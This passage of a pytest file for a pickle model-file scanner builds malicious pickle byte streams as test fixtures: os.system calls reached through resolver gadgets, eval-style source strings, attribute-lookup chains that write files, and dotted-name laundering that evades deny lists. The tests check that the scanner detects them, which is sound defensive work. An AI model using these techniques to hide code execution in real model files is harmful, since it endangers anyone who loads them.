    problem into one check, and it needs no list of its own because it re-runs
    the existing classification over the argument.
    """

    @pytest.mark.parametrize("resolver, target", [
        ("logging.config", "_resolve"),
        ("unittest.mock", "_dot_lookup"),
        ("xmlrpc.server", "resolve_dotted_attribute"),
        ("sympy.utilities.source", "get_class"),
        ("some.module.nobody.listed", "resolve"),
    ])
    def test_resolver_handed_a_denied_name_escalates(self, tmp_path, resolver, target):
        data = _reduce_stream(resolver, target, _short_binunicode("os.system") + b"\x85")

        findings = _scan(tmp_path, "resolver.pkl", data)
        actionable = [f for f in findings if f.severity != Severity.INFO]
        assert actionable, (
            f"{resolver}.{target}('os.system') stayed at INFO: "
            f"{[(f.rule_id, f.severity) for f in findings]}"
        )
        assert any(f.severity == Severity.HIGH for f in actionable)

    def test_bare_denied_module_name_also_counts(self, tmp_path):
        """`numpy.lib.utils._makenamedict('os')` passes only the module."""
        data = _reduce_stream("numpy.lib.utils", "_makenamedict",
                              _short_binunicode("os") + b"\x85")
        findings = _scan(tmp_path, "makenamedict.pkl", data)
        assert any(f.severity == Severity.HIGH for f in findings)

    @pytest.mark.parametrize("text", [
        "os_helper", "position", "systems", "pipeline.Model", "mypackage.os",
    ])
    def test_strings_that_merely_resemble_a_denied_name_do_not_fire(self, tmp_path, text):
        """The argument is classified with the same component-boundary rules
        used for resolved globals, so near-misses stay quiet."""
        data = _reduce_stream("mypackage.loader", "build",
                              _short_binunicode(text) + b"\x85")
        findings = _scan(tmp_path, f"near_{abs(hash(text))}.pkl", data)
        assert not [f for f in findings if f.severity == Severity.HIGH], text


# ── Argument that is Python source naming a denied target ───────────
#
# The exact-name check above sees `'os.system'` but not
# `"__import__('os').system('ls')"`, and the second is what every
# eval-family gadget is actually handed -- an evaluator needs an expression,
# not a name. Reading the argument through Python's own grammar closes that
# without adding a list: the same classifier runs over what the parse yields.

class TestSourceTextArgumentNamingDeniedTarget:
    @pytest.mark.parametrize("resolver,source", [
        # sympy's parser family, as released by PickleCloak.
        ("sympy.sympify", "__import__('os').system('ls')"),
        ("sympy.parsing.sympy_parser.eval_expr", '__import__("os").system("ls")'),
        ("sympy.utilities.lambdify.lambdify", "__import__('os').system('touch /tmp/x')"),
        # importlib spelling of the same move.
        ("mypkg.evaluate", "importlib.import_module('subprocess').run('x')"),
        # A plain attribute call, no dynamic import at all.
        ("mypkg.evaluate", "subprocess.check_output('id')"),
        # Statement form rather than an expression.
        ("mypkg.evaluate", "import os\nos.system('id')"),
    ])
    def test_source_argument_is_promoted_to_high(self, tmp_path, resolver, source):
        module, _, name = resolver.rpartition(".")
        data = _reduce_stream(module, name, _short_binunicode(source) + b"\x85")
        findings = _scan(tmp_path, "src.pkl", data)
        triaged = _triaged(findings)
        assert triaged, (
            f"{resolver}({source!r}) stayed at INFO: "
            f"{[(f.rule_id, f.severity) for f in findings]}"
        )
        assert triaged[0].severity == Severity.HIGH

    @pytest.mark.parametrize("text", [
        # Reads as English, does not parse as Python. The overwhelmingly
        # common shape for a model card that mentions a dangerous API.
        "Do not call os.system(cmd) from your loader",
        "BERT (uncased) trained on Wikipedia (2019)",
        # Parses, but resolves nothing denied.
        "scale(x) + offset",
        "transform(features)",
        # A format template, not code.
        "{name}({args})",
        # No call syntax at all, so the parser is never reached.
        "os.system",
    ])
    def test_benign_or_unparseable_text_does_not_fire_this_signal(self, tmp_path, text):
        """Only a *parse* that resolves a denied callable promotes. Prose that
        merely mentions one must not, or every model card becomes HIGH."""
        data = _reduce_stream("mypackage.card", "Card",
                              _short_binunicode(text) + b"\x85")
        findings = _scan(tmp_path, "card.pkl", data)
        source_hits = [
            f for f in _triaged(findings) if "which is Python source" in f.message
        ]
        assert not source_hits, text

    def test_oversized_string_is_not_parsed(self, tmp_path):
        """Parsing is the one place an argument *value* drives real work, and
        these bytes are attacker-chosen. Past the cap the string is skipped."""
        payload = "#" + "a" * 5000 + "\nos.system('id')"
        assert _pickle_source_denied_target(payload) is None


# ── The three-link gadget chain ─────────────────────────────────────

class TestDynamicMemberLookupChain:
    """Build an object, resolve a member on it by string, invoke the result.

    Keyed entirely on the shape of the call graph. All three links are
    required: the first two alone match a legitimate `__reduce__` that returns
    `(Outer, (inner_obj, 'field_name'))`.
    """

    @staticmethod
    def _chain(resolver_mod, resolver_name, target_mod, target_name, attr, invoke):
        """`resolver(target(), attr)`, optionally invoking the result."""
        stream = (
            b"\x80\x04"
            + _short_binunicode(resolver_mod) + _short_binunicode(resolver_name) + b"\x93"
            + _short_binunicode(target_mod) + _short_binunicode(target_name) + b"\x93"
            + b")R"                       # target() -> call result
            + _short_binunicode(attr)
            + b"\x86"                     # TUPLE2
            + b"R"                        # resolver(result, attr)
        )
        if invoke:
            stream += _short_binunicode("/tmp/out") + b"\x85" + b"R"
        return stream + b"."

    @pytest.mark.parametrize("resolver_mod,resolver_name,attr", [
        ("unittest.mock", "_dot_lookup", "save"),
        ("xmlrpc.server", "resolve_dotted_attribute", "write_results_file"),
        ("lib2to3.fixer_util", "attr_chain", "write_file"),
        # The resolver is interchangeable -- an unlisted one behaves the same.
        ("mypackage.util", "lookup_member", "to_string"),
    ])
    def test_invoked_lookup_result_is_promoted(self, tmp_path, resolver_mod, resolver_name, attr):
        data = self._chain(resolver_mod, resolver_name,
                           "http.cookiejar", "LWPCookieJar", attr, invoke=True)
        findings = _scan(tmp_path, "chain.pkl", data)
        triaged = _triaged(findings)
        assert triaged, (
            f"{resolver_mod}.{resolver_name} chain stayed at INFO: "
            f"{[(f.rule_id, f.severity) for f in findings]}"
        )
        assert triaged[0].severity == Severity.MEDIUM
        assert "its own result is then invoked" in triaged[0].message

    def test_uninvoked_result_stays_at_info(self, tmp_path):
        """The measured false positive this signal was tightened to avoid: a
        legitimate `__reduce__` passing a sibling object plus a field name.
        Without the third link there is no evidence of dynamic invocation."""
        data = self._chain("mypackage", "Outer", "mypackage", "Inner",
                           "feature_names", invoke=False)
        findings = _scan(tmp_path, "outer.pkl", data)
        assert not _triaged(findings), [
            (f.rule_id, f.severity, f.message) for f in findings
        ]
        assert _info(findings)

    def test_non_identifier_literal_does_not_chain(self, tmp_path):
        """The literal has to be usable as a member name. Free text handed to
        a chained call is a different signal's business, not this one's."""
        data = self._chain("mypackage", "resolve", "mypackage", "Inner",
                           "not an identifier", invoke=True)
        findings = _scan(tmp_path, "notident.pkl", data)
        chain_hits = [f for f in _triaged(findings) if "result is then invoked" in f.message]
        assert not chain_hits

    def test_persid_argument_is_not_a_call_result(self, tmp_path):
        """Real model pickles pass unresolvable arguments constantly -- every
        torch tensor is rebuilt from a PERSID storage. Those must not read as
        chaining, which is why call results are tracked separately from the
        generic opaque sentinel."""
        data = (
            b"\x80\x04"
            + _short_binunicode("torch._utils") + _short_binunicode("_rebuild_tensor_v2")
            + b"\x93"
            + _short_binunicode("storage-key") + b"Q"   # BINPERSID
            + _short_binunicode("weight")
            + b"\x86"                                    # TUPLE2
            + b"R."
        )
        _globals_found, calls, _memo = _resolve_pickle_globals(data)
        rebuilt = [c for c in calls if c.ref == "torch._utils._rebuild_tensor_v2"]
        assert rebuilt, "the call was not recorded at all"
        assert rebuilt[0].chained_from == ()

    def test_intermediary_between_lookup_and_invocation_still_chains(self, tmp_path):
        """The PickleCloak exp_5/exp_28/exp_88 shape: `next(attr_chain(...))`
        puts a call with NO literal text between the lookup and the
        invocation. That intermediary was never recorded, the invocation's
        mark landed nowhere, and the chain stayed at INFO. Now recorded
        (chained-only calls) and propagated by a backward fixpoint."""
        data = (
            b"\x80\x04"
            + _short_binunicode("lib2to3.fixer_util") + _short_binunicode("attr_chain") + b"\x93"
            + b"\x94\x94"                    # memo 0,1
            + _short_binunicode("distutils.tests.support") + _short_binunicode("TempdirManager") + b"\x93"
            + b"\x94\x94"                    # memo 2,3
            + _short_binunicode("builtins") + _short_binunicode("next") + b"\x93"
            + b"\x94\x94"                    # memo 4,5
            + b"h\x01h\x03"                  # BINGET attr_chain, TempdirManager
            + b")R"                          # TempdirManager()
            + _short_binunicode("write_file")
            + b"\x86"                        # TUPLE2
            + b"R"                           # attr_chain(instance, 'write_file')
            + b"\x85"                        # TUPLE1: (chain,)
            + b"R"                           # next(chain)
            + _short_binunicode("/tmp/write") + _short_binunicode("exploit_content")
            + b"\x86"                        # TUPLE2
            + b"R"                           # invoke the resolved method
            + b"."
        )
        findings = _scan(tmp_path, "exp28-shape.pkl", data)
        triaged = _triaged(findings)
        assert triaged, (
            f"intermediary chain stayed at INFO: "
            f"{[(f.rule_id, f.severity) for f in findings]}"
        )
        assert triaged[0].severity == Severity.MEDIUM
        assert "its own result is then invoked" in triaged[0].message


class TestDottedGlobalNameLaundering:
    """A deny list keyed on the joined `module.name` is bypassed by moving
    the interesting half into the *name*.

    For protocol 4 and above, `Unpickler.find_class` resolves the name with
    `pickle._getattribute`, which splits on "." and walks the attributes one
    segment at a time. So `GLOBAL "torch" "serialization.os.system"` reaches
    `os.system` on load, while the joined reference is
    `torch.serialization.os.system`, which matches no list entry and lands in
    the unknown bucket.

    The prefix supply is unlimited: any module that does `import os` works,
    and logging, shutil, zipfile, pathlib, tarfile, platform and site all do.
    Adding names to the deny list therefore cannot close this.

    The two-segment fixture below is the shape found in the wild (PickleBall's
    CCS'25 artifact, `ours/call_system.pkl`); note that the module half there
    is just `torch`, so checking only the whole qualname would miss it and the
    walk has to consider every tail.
    """

    def test_dotted_name_reaching_denied_callable_is_denied(self, tmp_path):
        data = (
            b"\x80\x04"
            + b"ctorch\nserialization.os.system\n"   # GLOBAL, dotted name
            + b"(" + _short_binunicode("echo pwned")
            + b"tR."                                  # TUPLE, REDUCE, STOP
        )
        findings = _scan(tmp_path, "laundered_global.pkl", data)
        denied = [f for f in findings if f.rule_id == "MFV-PICKLE-001"]
        assert denied, (
            "dotted-name laundering stayed out of the deny list: "
            f"{[(f.rule_id, f.severity) for f in findings]}"
        )
        assert "os.system" in denied[0].message

    def test_laundering_via_stack_global_is_denied(self, tmp_path):
        data = (
            b"\x80\x04"
            + _short_binunicode("zipfile") + _short_binunicode("os.system") + b"\x93"
            + _short_binunicode("echo pwned") + b"\x85"
            + b"R."
        )
        findings = _scan(tmp_path, "laundered_stack_global.pkl", data)
        denied = [f for f in findings if f.rule_id == "MFV-PICKLE-001"]
        assert denied, (
            "STACK_GLOBAL laundering stayed out of the deny list: "
            f"{[(f.rule_id, f.severity) for f in findings]}"
        )

    def test_deeper_tail_is_still_reached(self, tmp_path):
        """`_getattribute` walks every segment, so a tail buried further in
        resolves too: os -> os.path -> os.path.os -> .system."""
        data = (
            b"\x80\x04"
            + b"cos\npath.os.system\n"
            + b"(" + _short_binunicode("echo pwned")
            + b"tR."
        )
        findings = _scan(tmp_path, "laundered_deep.pkl", data)
        assert [f for f in findings if f.rule_id == "MFV-PICKLE-001"]

    def test_benign_dotted_qualname_is_not_promoted(self, tmp_path):
        """A nested class serialises as a dotted qualname too. Nothing is
        reported unless a tail resolves to something already denied, so the
        ordinary case is untouched."""
        data = (
            b"\x80\x04"
            + _short_binunicode("mypackage.models") + _short_binunicode("Outer.Inner")
            + b"\x93" + b")R."
        )
        findings = _scan(tmp_path, "benign_nested_class.pkl", data)
        assert not [f for f in findings if f.rule_id == "MFV-PICKLE-001"], (
            f"benign nested class was denied: {[f.rule_id for f in findings]}"
        )
